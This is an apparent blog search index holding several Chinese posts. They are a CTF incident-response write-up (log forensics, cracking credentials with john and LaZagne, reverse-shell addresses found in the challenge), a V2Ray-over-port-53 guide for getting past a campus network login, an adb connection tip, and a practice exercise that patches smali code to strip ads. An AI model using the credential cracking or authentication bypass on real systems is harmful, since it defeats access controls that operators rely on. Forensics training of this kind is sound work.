&#125;&#125;\n\n","categories":["网络服务"],"tags":["lua","nginx","ngx_lua"]},{"title":"第二届“Parloo”CTF应急响应挑战赛-应急相应方向-WriteUp","url":"/2025/05/20/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9CParloo%E2%80%9DCTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B-%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94%E6%96%B9%E5%90%91-WriteUp/","content":"畸形的爱攻击者ip地址1nginx日志 31网段之外的基本都是内网ip，所以不考虑palu{192.168.31.240}\n攻击者ip地址2这道题目没做出来，主要原因是光做主线了，这个简单过了一下，没有在意到docker容器，在webserver中有一个webdata容器，开启会报错，原因是在题目创建时绑定了一个当时主机的ip，复现的虚拟机因为环境问题无法从挂起状态恢复导致虚拟机的ip被本地的dhcp更换了，所以开启不了，具体报错如下\nroot@ubuntu:/var/www/html# docker start WebDataError response from daemon: driver failed programming external connectivity on endpoint WebData (d139b4f26019de0d9e2dc495f1917ce3e47443f38d283802da47eb972ded07cb): Error starting userland proxy: listen tcp 192.168.87.101:8061: bind: cannot assign requested addressError: failed to start containers: WebData\n通过下面命令可以临时加一条对应的ip让其临时开启容器进入里面查看数据\nsudo ip addr add 192.168.87.101/24 dev ens33\n进入机器后发现反弹的后门ippalu{192.168.31.11}\n暴力破解开始时间这道题目也没做出来没注意到容器,这个日志是通过\ndocker logs phpmyadmin\n获取到的，在这个容器中存在大量爆破日志palu{2025:03:05:58}\nflag1win10直接搜索palu{pc3_zgsfqwerlkssaw}\nflag2win10的最近使用里palu{nizhidaowoyouduoainima}\nflag3这个也没做出来，具体原因似乎是没怎么在乎数据库的内容，光去看webserver了，从webserver的网页代码中获取到数据库的账号密码通过账号密码连接数据库查看数据库数据，发现很多base64挨个解码后发现第三个内容如下\n[&#123;&quot;item_id&quot;:1,&quot;item_name&quot;:&quot;flag3palu&#123;sqlaabbccsbwindows&#125;&quot;,&quot;quantity&quot;:2,&quot;price&quot;:199.99&#125;,&#123;&quot;item_id&quot;:3,&quot;item_name&quot;:&quot;英国复印&quot;,&quot;quantity&quot;:1,&quot;price&quot;:59.99&#125;]\npalu{sqlaabbccsbwindows}\n提交钓鱼文件的哈希32位大写在回收站中有一个奇怪的zip恢复后沙箱分析palu{2977CDAB8F3EE5EFDDAE61AD9F6CF203}\nwebshell密码1没做出来，没看容器，在容器中直接就能看到webshell密码palu{hack}\n攻击者开放3个端口没接出来，这个本来是想法查网络端口，但是没有思路，好多端口都开放。首先是第一个在攻击者ip2中，在清理脚本中就发现了一个反弹shell的脚本，上面就有端口1133，其他目前没找到，然后据群友说有一个是在/tmp/r.sh位置，在第一次开机的时候存在好像是1144，等官方题解吧。\nwebshell密码2网站目录下palu{00232}\n隐藏账户的密码没解出来，没发现隐藏账户。。赛后才发现在win10中通过工具发现额外的账户通过LaZagne获取出他的hash然后通过kali跑一下字典，这个在cmd5中是可以查询到的，但是是付费的，直接通过万能群友直接出了palu{wmx_love}还有就是john就不要试了，我跑了15分钟都没出…\n[溯源]攻击者的邮箱没有解出来，没想到是这种方法。。。根据病毒侵害的主机得知王美欣的名字，去github搜索拿到githubid并且同通过id可以去github用户反查api中得知他的邮箱为palu{n0k4u@outlook.com}\n[溯源]flag4没解出来，上面搜索仓库拿到一个密语这是一个qq号直接去添加拿到flag4palu{loveyouibiejv}\nsolar_Linux后门排查通过命令ss -tulnpa查看连接发现后门通过pid直接拿到文件直接连接过去这台机器直接就出flag了\n取证主线1.提交堡垒机中留下的flagflag:palu{2025_qiandao_flag}\n2.提交WAF中隐藏的flagpalu{2025_waf}\n3.提交Mysql中留下的flagpalu&#123;Mysql_@2025&#125;\n4.提交攻击者的攻击IP\n5.提交攻攻击者最早攻击时间提交攻攻击者最早攻击时间flag格式为palu{xxxx-xx-xx-xx-xx-xx}，这个时间格式是错误的。。。一直没交上，最后半小时才说格式不对。。palu{2025-05-05-00:04:40}\n6.提交web服务泄露的关键文件名在waf的静态网站文件中有一个key.txtpalu{key.txt}\n7.题解泄露的邮箱地址在key.txt中最后面有邮箱palu{parloo@parloo.com}\n8.提交立足点服务器ip地址palu{192.168.20.108}服务端的爆破流量堡垒机中的ssh爆破流量也来自108lastb\n9.提交攻击者使用的提权的用户和密码在sshserver中的passwd中发现parloo用户，通过john直接爆破出flagpalu{parloo&#x2F;parlook}\n10.提交攻击者留下的的文件内容作为flag提交在sshserver中，在parloo用户的家目录中发现flag\n11.提交权限维持方法的名称没做出来，具体原因是没有思路。。。题目太多了就做别的题目了。。在sshserver中通过命令\nsystemctl list-units --type=service --state=running\n列出了所有已经在运行的服务，发现有两个奇怪的服务仔细看一下这个服务发现问题运行的b4b40c44ws，这个在受感染的机器中可以找到，放入沙箱之后可以发现这是一个木马。palu{rootset}\n12.提交攻击者攻击恶意服务器连接地址作为flag提交在Server01中发现后门用户的家目录中发现aa程序ida分析palu{47.101.213.153}\n13.找到系统中被劫持的程序程序名作为flag提交没解出来，在sshserver中，通过下面命令\nfind ./ -ytpe f -newermt &quot;2025-05-6&quot; ! -newermt &quot;2025-05-010&quot;\n搜索近期5月份被修改的文件可以找到题目说是被劫持的，所以是palu{id}\n14.找到系统中存在信息泄露的服务运行端口作为flag提交在面板中或者服务器使用ss -tnl都可以发现额外的端口，直接访问palu{8081}\n15.提交Parloo公司项目经理的身份证号作为flag提交在server01主机的8081端口中可以直接发现，可以直接编辑palu{310105198512123456}\n16.提交存在危险功能的操作系统路径作为flag提交没做出来…在waf中发现有一个应用路由如下\n发现可以执行命令palu{&#x2F;admin&#x2F;parloo}\n17.提交进源机器中恶意程序的MD5作为flag进行提交。没做出来，火绒剑中可以看到启动项中存在一个奇怪的内容文件拖入到沙箱中发现是恶意程序palu{8cc6fc843882735e1c1152b383e35e3b}\n18.提交攻击者留下的恶意账户名称md5后作为flag进行提交在登录的时候就有hack 在用户目录下也发现了palu{d78b6f30225cdc811adfe8d4e7c9fd34}\n19.提交内部群中留下的flag并提交palu{nbq_nbq_parloo}\n20.请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交没出 在17题中，发现了软件的被代理端是server服务器上的，通过查看端口(waf中其实写好了是8080)-&gt;通过端口查pid-》id拿到文件位置-》拿到位置发现有日志查看日志发现是空的，又通过用户记录发现了一个相同文件名字，查看拿到flag日志很乱直接过滤flag就可以出了palu{Server_Parloo_2025}\n21.提交获取敏感内容IP的第一次执行命令时间作为flag进行提交没出对应20，日志第一条就是flagpalu{192.168.20.1}\n22.提交攻击者使用的恶意ip和端口没做出，通过下面命令拿到反弹shell地址\ncat /var/log/parloo/command.log |grep -e &quot;^\\[&quot; |awk -F &quot;|&quot; &#x27;&#123;print $2&#125;&#x27;\npalu{10.12.12.13:9999}\n23.提交重要数据的内容作为flag提交没做出，在PC3机器发现重要数据，直接提交没用具体的解密脚本在gitea的hack仓库中具体的进入私人仓库的方法可以在39问中找到，当时想到了可能是这个加密的，但是做其他的题目给忘了。。。具体的加密逻辑如下\ndef custom_encrypt(text, key):    encrypted = []    key_bytes = [ord(c) for c in key]    for i, char in enumerate(text):        shifted = ord(char) + (i % 5 + 1)        xor_key = key_bytes[i % len(key_bytes)]        xored = shifted ^ xor_key        substituted = ((xored &amp; 0x0F) &lt;&lt; 4) | ((xored &amp; 0xF0) &gt;&gt; 4)        encrypted.append(f&quot;&#123;substituted:02x&#125;&quot;)    return &quot;&quot;.join(encrypted)\n这里只是加密脚本需要自己推回来解密脚本，我这里直接通过ai出\ndef custom_decrypt(encrypted_text, key):    decrypted = []    key_bytes = [ord(c) for c in key]        # Process the encrypted text two characters at a time (hex pairs)    for i in range(0, len(encrypted_text), 2):        # Convert hex pair to integer        substituted = int(encrypted_text[i:i+2], 16)                # Reverse nibble swap        xored = ((substituted &amp; 0x0F) &lt;&lt; 4) | ((substituted &amp; 0xF0) &gt;&gt; 4)                # Reverse XOR with key        xor_key = key_bytes[i // 2 % len(key_bytes)]        shifted = xored ^ xor_key                # Reverse the position-based shift        char_code = shifted - ((i // 2 % 5) + 1)                # Convert back to character        decrypted.append(chr(char_code))        return &quot;&quot;.join(decrypted)\n现在还缺少一个密钥，因为flag的格式是palu&#123;他这里的几秒也是按位进行的，直接把条件给ai让他去推前缀是MySec，最后面是一个k，我就不多加ai的截图了线索就是MySec*k这大概率是单词，后面可以菜是key中间大概率是秘密慢慢试就出了MySecretKey完整脚本如下\ndef custom_encrypt(text, key):    encrypted = []    key_bytes = [ord(c) for c in key]    for i, char in enumerate(text):        shifted = ord(char) + (i % 5 + 1)        xor_key = key_bytes[i % len(key_bytes)]        xored = shifted ^ xor_key        substituted = ((xored &amp; 0x0F) &lt;&lt; 4) | ((xored &amp; 0xF0) &gt;&gt; 4)        encrypted.append(f&quot;&#123;substituted:02x&#125;&quot;)    return &quot;&quot;.join(encrypted)def custom_decrypt(encrypted_text, key):    decrypted = []    key_bytes = [ord(c) for c in key]    # Process the encrypted text two characters at a time (hex pairs)    for i in range(0, len(encrypted_text), 2):        # Convert hex pair to integer        substituted = int(encrypted_text[i : i + 2], 16)        # Reverse nibble swap        xored = ((substituted &amp; 0x0F) &lt;&lt; 4) | ((substituted &amp; 0xF0) &gt;&gt; 4)        # Reverse XOR with key        xor_key = key_bytes[i // 2 % len(key_bytes)]        shifted = xored ^ xor_key        # Reverse the position-based shift        char_code = shifted - ((i // 2 % 5) + 1)        # Convert back to character        decrypted.append(chr(char_code))    return &quot;&quot;.join(decrypted)print(custom_decrypt(&quot;c3a1c3c13e326020c3919093e1260525045e&quot;, &quot;MySecretKey&quot;))\npalu{Password-000}\n24.提交恶意维权软件的名称作为flag进行提交没做出，同17问palu{svhost}\n25.提交恶意程序的外联地址在palu3中家目录里有一个ipconfig反编译后拿到原代码敏感信息palu{88.173.90.103}\n26.提交攻击这使用的恶意dnslog域名作为flag进行提交没做出，在22问的命令中，可以发现下面命令肯定是他们其中一个，palu{np85qqde.requestrepo.com}\n27.提交寻找反序列化漏洞的端口作为flag进行提交没做出，可以在waf的反序列化攻击类型中找到相应的日志，然后日志不多就两页，挨个排查，出现404的基本不能存在反序列化漏洞了，嫌疑最大的就是9999\npalu{9999}\n28.提交web服务泄露的密钥作为flag进行提交在server里有一个adminaf.jar,jadx反编译后拿到flagpalu&#123;QZYysgMYhG6/CzIJlVpR2g==&#125;\n29.提交攻击者开始攻击的时间作为flag进行提交这个没出，到现在也没出，看其他师傅的wp也都没出。。。\n30.提交攻击者在server中留下的账户密码作为flag进行提交在server主机的passwd中发现通过 john拿到密码palu{parloohack&#x2F;123456}\n31.提交攻击者维权方法的名称作为flag进行提交在server主机中parloohack用户的bash_history中发现下面内容采用服务的方式palu{parloohack_script.service}\n32.提交攻击者留下的木马md5后作为flag进行提交在server主机中parloohack用户家目录中发现奇怪文件通过沙箱发现是木马palu{4123940b3911556d4bf79196cc008bf4}\n33.提交攻击者留下的溯源信息作为flag进行提交palu{X5E1yklz1oAdyHBZ}\n34.提交攻击者的githubID作为flag进行提交没出，在33题中的用户名是一个qq号，查看qq空间内容如下palu{ParlooSEc}\n35.提交攻击者在github下留下的的内容作为flag进行提交没出，在34题中拿到id进入他的仓库拿到flagpalu{s5o3WkX33hptyJjk}\n36.提交恶意用户的数量作为flag进行提交palu{99}\n37.提交恶意用户的默认密码作为flag进行提交似乎不对，因为我是在java后门中找到的在server1主机中发现了一adminAF.jar反编译发现默认用户名是admin密码是123456palu{123456}这道题目是意外出的，按理说这个程序似乎是人家公司自己的，不是恶意用户。。。意外的。。。\n38.提交业务数据中攻击者留下的信息作为flag进行提交mysql主机的gitea的用户表中palu{crP1ZIVfqrkfdhGy}\n39.提交私人git仓库中留下的内容作为flag进行提交重置admin密码\n224d7f8df25c:/$ gitea admin user change-password --username &quot;admin&quot; --password &quot;Qwer1234&quot;\n登录发现flag(base64解码)palu{FO65SruuTukdpBS5}\n40.提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交没出，这个没仔细看…炒在mysql的root目录下，存在下面内容.a很可疑，ida反编译出下面内容数据输出就是创建隐藏文件。。palu{ba7c9fc1ff58b48d0df5c88d2fcc5cd1}\n41.提交恶意程序中模拟c2通信的函数名称作为flag进行提交没出，同40题目程序palu{simulate_network_communication}\n42.提交恶意程序创建隐藏文件的名称作为flag提交没出，同40题目程序palu{.malware_log.txt}\n43.提交恶意程序中模拟权限提升的函数作为flag进行提交没出，同40题目程序palu{simulate_privilege_escalation}\n44.提交被钓鱼上线的用户名作为flag进行提交只有在子怡的PC(PC2)中发现了浏览器的记录并且存在访问记录palu{Parloo-子怡}\n45.提交恶意程序的所在路径作为flag进行提交没出，在PC2的聊天记录中发现程序拖入沙箱是个木马palu{C:\\Users\\Public\\Nwt\\cache\\recv\\Parloo-沉沉}\n46.分析恶意程序的反连地址作为flag进行提交没出，很奇怪这道题我怎么没出。。都找到了。。。依旧是在浏览器的账号管理中，44题的截图palu{47.101.213.153}\n47.提交恶意c2的服务器登录的账号密码作为flag进行提交。palu2 谷歌浏览器中直接获取palu{admin&#x2F;admin@qwer}\n写在后面除了应急响应方向的应急1的攻击者开放3个端口和应急2的29基本在赛后都出了，应急响应的比赛打得太少了，赛后复现感觉好多题目都能出，还得好好练练…\n","categories":["CTF相关","WriteUp"],"tags":["CTF","WriteUp","Forensics"]},{"title":"绕过校园网WEB认证解决方案","url":"/2023/03/07/%E7%BB%95%E8%BF%87%E6%A0%A1%E5%9B%AD%E7%BD%91WEB%E8%AE%A4%E8%AF%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","content":"原理分析先说一下原理，连接上校园网设备之后只要不进行认证，大部分的流量只要是经过校园网设备都会拦截之后给客户端重定向到一个认证页面(本文封面)，让其进行认证。不进行认证的小部分流量比如说是dhcp、dns都不会进行拦截重定向，dhcp要进行分配ip，刚连接的设备需要通过这个dhcp才可以拿到自己的ip地址，dns是域名解析服务也不会拦截。他们的端口分别是DHCP(UDP&#x2F;67服务端、UDP&#x2F;68客户端)、DNS(UDP&#x2F;53)，目前只发现了这两个服务的端口是不被拦截的。我们可以通过这些端口来绕过流量的拦截。例如使用虚拟专用网络、虚拟隧道等技术来实现绕过拦截。\n干！！！软件介绍本文服务端使用V2ray软件进行绕过，项目地址以及文档地址如下：\n项目地址:https://github.com/v2fly/v2ray-core\n文档地址:https://www.v2fly.org/\n客户端为了方便采用V2rayN和服务端进行链接，项目地址如下：\n项目地址:https://github.com/2dust/v2rayN\n部署搭建我们在服务端部署一下v2ray，如何去下载这里不多讲解，部署方式如下\n# 下载[root@dj1 work]# wget https://github.com/v2fly/v2ray-core/releases/download/v5.3.0/v2ray-linux-64.zip100%[==============================================================================================&gt;] 11,706,579  3.22MB/s   in 3.5s# 解压[root@dj1 work]# unzip v2ray-linux-64.zip Archive:  v2ray-linux-64.zip  inflating: config.json               inflating: geosite.dat               inflating: geoip-only-cn-private.dat     creating: systemd/   creating: systemd/system/  inflating: systemd/system/v2ray.service    inflating: systemd/system/v2ray@.service    inflating: vpoint_socks_vmess.json    inflating: geoip.dat                 inflating: v2ray                     inflating: vpoint_vmess_freedom.json# 配置[root@dj1 work]# mv config.json config.json.bak[root@dj1 work]# vim config.json# 配置如下&#123;    &quot;inbounds&quot;: [        &#123;            &quot;port&quot;: 53, // 服务器监听端口            &quot;protocol&quot;: &quot;vmess&quot;,            &quot;settings&quot;: &#123;                &quot;clients&quot;: [                    &#123;                        &quot;id&quot;: &quot;0297a6ed-9152-4ad1-a80a-b248a9c4d3ad&quot;                    &#125;                ]            &#125;,            &quot;streamSettings&quot;: &#123;                &quot;network&quot;: &quot;mkcp&quot;, //此处的 mkcp 也可写成 kcp，两种写法是起同样的效果                &quot;kcpSettings&quot;: &#123;                    &quot;uplinkCapacity&quot;: 5,                    &quot;downlinkCapacity&quot;: 100,                    &quot;congestion&quot;: true,                    &quot;header&quot;: &#123;                        &quot;type&quot;: &quot;none&quot;                    &#125;                &#125;            &#125;        &#125;    ],    &quot;outbounds&quot;: [        &#123;            &quot;protocol&quot;: &quot;freedom&quot;        &#125;    ]&#125;# 运行v2ray,这里采用screen工具放在后台运行.[root@dj1 work]# screen -S V2[root@dj1 work]# ./v2ray runV2Ray 5.3.0 (V2Fly, a community-driven edition of V2Ray.) Custom (go1.20 linux/amd64)A unified platform for anti-censorship.2023/03/17 13:02:30 Using default config:  /root/work/config.json2023/03/17 13:02:30 [Warning] V2Ray 5.3.0 started# ctrl + a + d[detached from 81853.V2]\n\n这里就配置好了，我这里用的是V2ray的VMess协议端口用的是dns的53端口关于VMess的配置文档可以在V2ray的文档中找到这里不多做解释，clients中的id算是链接的token，需要记住，这个id不能随便写，需要通过特殊的算法生成可以直接使用v2rayn来生成 这里也多做讲解。\n客户端链接下载方式这里不细说了，去github中的版本列表中都有。下载好之后打开软件，在左上角服务器-》添加VMess服务器中配置,配置如下\n\n地址填写自己的服务器地址，用户id这里可以直接生成，需要和服务端一样。协议选择kcp即可。\n配置好之后”右键左下角的v2ray的图标选择路由-》全局”。之后再设置一下代理”右键右下角图标-》系统代理-》自动配置系统代理”。\n连接上校园网之后就会发现不会再跳转到认证页面。实际上网的速度和服务器的网络规格挂钩。不是用校园网的时候建议关闭代理不然数据会一直走代理会出现限速的现象可以通过”右键右下角图标-》系统代理-》清除系统代理”来解决。\n\n","categories":["折腾相关"],"tags":["开源工具","V2Ray","校园网"]},{"title":"虚机adb连接安卓模拟器","url":"/2025/03/20/%E8%99%9A%E6%9C%BAadb%E8%BF%9E%E6%8E%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8/","content":"问题复现博主用的是雷电模拟器+VMware-Ubuntu虚拟机，雷电模拟器有自己的内部网络，然后虚机用的网络模式也是NAT，因为对这个安卓模拟器的网络结构不是很了解，我尝试直接通过虚机去adb连接NAT内宿主机的IP，命令如下\nboychai@lab:~$ sudo adb connect 10.0.0.1:5555failed to connect to 10.0.0.1:5555\n连接是失败的，也尝试过通过打开雷电模拟器的远程ADB调试，依旧是失败的。\n解决方案这里找到了一个通用的解决方案，只要是两个设备网络可以联通即可实现adb的连接，不去别于设备是否为虚机、模拟器、实机，只要是在同网络下都可行。以雷电模拟器为例，在设置-&gt;网络中有两个选项，第一个是网络连接，默认是开启的，然后第二个是网络桥接模式，把这个打开，第一次打开可能需要安装驱动，跟随提示点击即可，开启后如下图桥接的网卡，需要选择对应设备可以联通的网络，保存后重启。重启过后安装WiFi ADB - Debug Over Air 2.1.3这个软件，开启后即可看到连接IP与端口，如下图安卓模拟器是桥接的我本地WIFI，我虚机的网络是在VMware的NAT网络模式下的，虽然套了一层，但是NAT网络模式下的虚机依旧可以访问到我本地WIFI的所有设备，所以直接通过他给的这个命令就可以直接连接，结果如下\n写在后面WiFi ADB - Debug Over Air 2.1.3这个软件的官方维护地址没有找到，我是通过下面链接获取到的这个软件，软件链接与原文链接如下软件原文： https://bbs.kanxue.com/thread-257380.htm软件链接： https://boychai.lanzout.com/ifxiz2r57bra 密码:52pj\n","categories":["问题解决"],"tags":["问题解决","adb","Android"]},{"title":"记一次安卓逆向学习实践-去除广告","url":"/2025/03/18/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5-%E5%8E%BB%E9%99%A4%E5%B9%BF%E5%91%8A/","content":"写在前面相关教程： https://www.bilibili.com/video/BV1wT411N7sV相关帖子： https://www.52pojie.cn/thread-1706691-1-1.html相关附件可以从相关帖子中拿到地址，这里不多说环境相关的内容了。\n广告展示打开软件的第三关，打开之后有一个等待三秒的提示如下图提示完毕之后的内容是一号弹窗\n广告去除给爷停三秒在MT管理器的Activity的记录中，找到下面内容这代表当前等待的这个页面的名字是AdActivity，我们通过jadx-gui找到这个位置查看这个函数发现下面java代码\npublic final class AdActivity extends AppCompatActivity &#123;    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    public void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.ad_activity);        loadAd();    &#125;    /* JADX INFO: Access modifiers changed from: private */    public final void jump() &#123;        startActivity(new Intent(this, (Class&lt;?&gt;) ChallengeThird.class));        finish();    &#125;    private final void loadAd() &#123;        new Handler().postDelayed(new Runnable() &#123; // from class: com.zj.wuaipojie.ui.AdActivity$$ExternalSyntheticLambda0            @Override // java.lang.Runnable            public final void run() &#123;                AdActivity.this.jump();            &#125;        &#125;, 3000L);    &#125;&#125;\n上面的onCreate是这个组件声明周期的一部分，代码会优先走到这里，然后调用loadAd函数，loadAd函数的主要内容是延迟3000毫秒之后执行自己的jump函数，这里的3000毫秒估计就是咱们打开页面等待的那个3秒，对应起来了，我们需要修改这个地方，改成0即可跳过，我们去看他的smali代码\n.method private final loadAd()V    .registers 5    .line 27    new-instance v0, Landroid/os/Handler;    invoke-direct &#123;v0&#125;, Landroid/os/Handler;-&gt;&lt;init&gt;()V    new-instance v1, Lcom/zj/wuaipojie/ui/AdActivity$$ExternalSyntheticLambda0;    invoke-direct &#123;v1, p0&#125;, Lcom/zj/wuaipojie/ui/AdActivity$$ExternalSyntheticLambda0;-&gt;&lt;init&gt;(Lcom/zj/wuaipojie/ui/AdActivity;)V    const-wide/16 v2, 0xbb8    invoke-virtual &#123;v0, v1, v2, v3&#125;, Landroid/os/Handler;-&gt;postDelayed(Ljava/lang/Runnable;J)Z    return-void.end method\n在const-wide/16 v2, 0xbb8这里有一个0xbb8估计就是他的延迟时间了，他这个是16进制的数值，转换成10进制刚好就是3000，这里我们通过np管理器给他修改以下保存之后再此打开应用，发现这个页面直接跳过了\n一号、二号广告已就位跳过上面暂停3秒的页面之后来到了这里，出现了一号广告位，通过MT管理器的Activity的记录得知他的页面名字是ChallengeThird，如下图好，我们继续通过jadx去分析，通过搜索窗体名称，也可以通过字符串搜到这里，找到这个函数打开代码直接就能发现下面源代码，二号广告位也在这里。\npublic void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_challenge_third);        ChallengeThird challengeThird = this;        AlertDialog.Builder builder = new AlertDialog.Builder(challengeThird);        builder.setTitle(&quot;这是二号广告标题&quot;);        builder.setMessage(&quot;这是二号广告内容&quot;);        builder.setCancelable(false);        builder.setPositiveButton(&quot;前往论坛&quot;, new DialogInterface.OnClickListener() &#123; // from class: com.zj.wuaipojie.ui.ChallengeThird$$ExternalSyntheticLambda1            @Override // android.content.DialogInterface.OnClickListener            public final void onClick(DialogInterface dialogInterface, int i) &#123;                ChallengeThird.m43onCreate$lambda2$lambda0(ChallengeThird.this, dialogInterface, i);            &#125;        &#125;);        builder.setNegativeButton(&quot;退出软件&quot;, new DialogInterface.OnClickListener() &#123; // from class: com.zj.wuaipojie.ui.ChallengeThird$$ExternalSyntheticLambda2            @Override // android.content.DialogInterface.OnClickListener            public final void onClick(DialogInterface dialogInterface, int i) &#123;                System.exit(0);            &#125;        &#125;);        builder.show();        new CommonDialog.Builder(challengeThird).setMessage(&quot;一号广告弹窗已就位&quot;).setNegativeButton(&quot;退出软件&quot;, new DialogInterface.OnClickListener() &#123; // from class: com.zj.wuaipojie.ui.ChallengeThird$$ExternalSyntheticLambda3            @Override // android.content.DialogInterface.OnClickListener            public final void onClick(DialogInterface dialogInterface, int i) &#123;                System.exit(0);            &#125;        &#125;).setMessageColor(ViewCompat.MEASURED_STATE_MASK).setPositiveButton(&quot;前往论坛&quot;, new DialogInterface.OnClickListener() &#123; // from class: com.zj.wuaipojie.ui.ChallengeThird$$ExternalSyntheticLambda0            @Override // android.content.DialogInterface.OnClickListener            public final void onClick(DialogInterface dialogInterface, int i) &#123;                ChallengeThird.m46onCreate$lambda4(ChallengeThird.this, dialogInterface, i);            &#125;        &#125;).setWith(0.8f).create().show();        checkUpdate();    &#125;\n分析一下代码发现这两个弹窗刚好对应着俩show()函数，他一个窗口是通过builder对象创建的，还有一个是通过直接new到头然后直接执行的show()，好，拿到这个信息我们思路就清晰了，把这俩show函数给注释掉估计就成功了，我们再看一下这俩show在smali的什么位置，这里smali很长，我直接用图片展示了，下图是一号窗口的show函数位置然后在38行又可以直接找到另外一个show()他们在smali的函数分别是284和334，我们去NP中给他注释掉，如下图注释之后保存，打开软件，这两条确实是消失了，但是又有一个图片类型的广告\n图片横幅广告这种图片形式的，无法通过关键字搜索，我们通过开发助手的布局查看来看一下这个图片的一个资源id打开布局查看器之后再次打开软件，选中广告位，如下图选中会有一个View ID(hex)，复制这个内容，去用这个资源的id去np管理器中搜索，查询到他的位置打开这个文件之后会发现id根本就不存在，我们再去通过jdax去搜索这个id，发现了一个资源名称，如下图他的名字是third_ad_image，这个是可以在那个资源文件中找到的，这刚好对应起来了找到这个内容之后我们修改他的布局属性，高度和宽度，它默认的是wrap_content和150.0dip我们都给他修改成0dp，然后再此打开软件，成功的变成了无广告。\n写在后面我要速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速速成逆向🤓👌\n","categories":["逆向工程","Android"],"tags":["REVERSE","Android","smali"]}]